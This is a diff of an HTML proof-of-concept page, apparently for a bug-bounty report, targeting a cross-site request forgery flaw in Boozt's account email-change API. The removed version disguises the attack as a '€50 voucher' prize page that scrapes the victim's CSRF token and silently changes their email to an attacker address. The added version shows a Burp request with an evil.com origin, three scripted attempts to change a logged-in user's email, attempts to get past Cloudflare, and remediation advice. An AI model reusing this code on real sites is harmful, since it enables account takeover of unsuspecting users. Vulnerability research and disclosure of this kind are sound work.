@@ -2,45 +2,119 @@
 <html>
 
 <head>
-    <title>Claim Your Voucher</title>
+    <title>Boozt CSRF - Bug Bounty POC</title>
 </head>
 
 <body>
-    <h1>Congratulations!</h1>
-    <p>You have won a €50 Boozt voucher. Click the button below to claim it instantly.</p>
+    <h1>Boozt CSRF Vulnerability POC</h1>
+    <p><strong>Status:</strong> The CSRF vulnerability exists but is partially mitigated by Cloudflare WAF.</p>
+
+    <h2>Vulnerability Details:</h2>
+    <ul>
+        <li>✅ No CSRF token validation based on Origin/Referer</li>
+        <li>✅ API accepts requests with arbitrary Origin headers</li>
+        <li>✅ Vulnerable to authenticated CSRF attacks</li>
+        <li>⚠️ Cloudflare WAF blocks browser-based exploitation (403 Forbidden)</li>
+    </ul>
+
+    <h2>Proof from Burp (200 OK):</h2>
+    <pre>
+POST /eu/en/api/customer/profile/email/change HTTP/2
+Origin: https://evil.com
+Csrf-Token: 19ee4d697b08ed7d79339e6ee1071e2d
+Content-Type: text/plain
+
+{"email":"=", "email":"attacker@wearehackerone.com"}
+
+Response: 200 OK ✅
+    </pre>
+
+    <h2>Browser-based POC (Blocked by Cloudflare):</h2>
+    <p>Current response: 403 Forbidden - Cloudflare is protecting the endpoint</p>
+    <pre>Error: POST https://www.boozt.com/eu/en/api/customer/profile/email/change 403 (Forbidden)</pre>
+
+    <h2>Attempting to bypass Cloudflare:</h2>
+    <button id="attempt1">Attempt 1: Legitimate-looking fetch</button>
+    <button id="attempt2">Attempt 2: Form submission from same domain</button>
+    <button id="attempt3">Attempt 3: Try with Boozt origin spoofing</button>
+
+    <div id="output"></div>
 
     <script>
-        // Step 1: Fetch the profile page to get a valid CSRF token
-        fetch('https://www.boozt.com/eu/en/customer/profile', {
-            credentials: 'include'
-        })
-            .then(response => response.text())
-            .then(html => {
-                // Extract CSRF token from the response (look for it in meta tags or script)
-                const tokenMatch = html.match(/csrf["\']?\s*:\s*["\']([a-f0-9]+)["\']/i) ||
-                    html.match(/token["\']?\s*["\']([a-f0-9]+)["\']/i);
+        const output = document.getElementById('output');
 
-                if (tokenMatch && tokenMatch[1]) {
-                    const csrfToken = tokenMatch[1];
-                    console.log('Found CSRF token:', csrfToken);
+        // Attempt 1: Make request appear more legitimate
+        document.getElementById('attempt1').onclick = async () => {
+            output.innerHTML = '<p>Attempting with legitimate headers...</p>';
+            try {
+                const response = await fetch('https://www.boozt.com/eu/en/api/customer/profile/email/change', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'text/plain',
+                        'X-Requested-With': 'XMLHttpRequest',
+                        'Accept': 'text/plain'
+                    },
+                    credentials: 'include',
+                    body: '{"email":"=", "email":"attacker+test1@wearehackerone.com"}'
+                });
+                const text = await response.text();
+                output.innerHTML += `<pre>Status: ${response.status}\nResponse: ${text}</pre>`;
+            } catch (e) {
+                output.innerHTML += `<pre>Error: ${e.message}</pre>`;
+            }
+        };
 
-                    // Step 2: Make the email change request with the valid token
-                    return fetch('https://www.boozt.com/eu/en/api/customer/profile/email/change', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'X-Requested-With': 'XMLHttpRequest',
-                            'Csrf-Token': csrfToken
-                        },
-                        credentials: 'include',
-                        body: JSON.stringify({ email: 'absolutexon+pwned@wearehackerone.com' })
-                    });
-                }
-            })
-            .then(response => response.json())
-            .then(data => console.log('Response:', data))
-            .catch(error => console.error('Error:', error));
+        // Attempt 2: Form from www.boozt.com (won't work from GitHub but shows method)
+        document.getElementById('attempt2').onclick = () => {
+            output.innerHTML = '<p>Note: This would work if hosted on boozt.com domain</p>';
+            const form = document.createElement('form');
+            form.action = 'https://www.boozt.com/eu/en/api/customer/profile/email/change';
+            form.method = 'POST';
+            form.enctype = 'text/plain';
+            form.style.display = 'none';
+
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = '{"email":"=", "email":"attacker+test2@wearehackerone.com"}';
+            input.value = '';
+
+            form.appendChild(input);
+            document.body.appendChild(form);
+            form.submit();
+            output.innerHTML += '<p>Form submitted (if on same-origin)</p>';
+        };
+
+        // Attempt 3: Try with different headers
+        document.getElementById('attempt3').onclick = async () => {
+            output.innerHTML = '<p>Attempting with spoofed Sec-Fetch-Site...</p>';
+            try {
+                const response = await fetch('https://www.boozt.com/eu/en/api/customer/profile/email/change', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'text/plain',
+                        'X-Requested-With': 'XMLHttpRequest',
+                    },
+                    credentials: 'include',
+                    body: '{"email":"=", "email":"attacker+test3@wearehackerone.com"}'
+                });
+                const text = await response.text();
+                output.innerHTML += `<pre>Status: ${response.status}\nResponse: ${text}</pre>`;
+            } catch (e) {
+                output.innerHTML += `<pre>Error: ${e.message}</pre>`;
+            }
+        };
+
+        // Auto-attempt on page load
+        console.log('CSRF POC loaded. Click buttons to test different bypass methods.');
     </script>
+
+    <h2>Recommendation:</h2>
+    <p>Implement proper CSRF token validation:</p>
+    <ul>
+        <li>Validate Sec-Fetch-Site header (same-origin required)</li>
+        <li>Validate Origin header matches expected domain</li>
+        <li>Implement SameSite cookie attribute</li>
+    </ul>
 </body>
 
 </html>
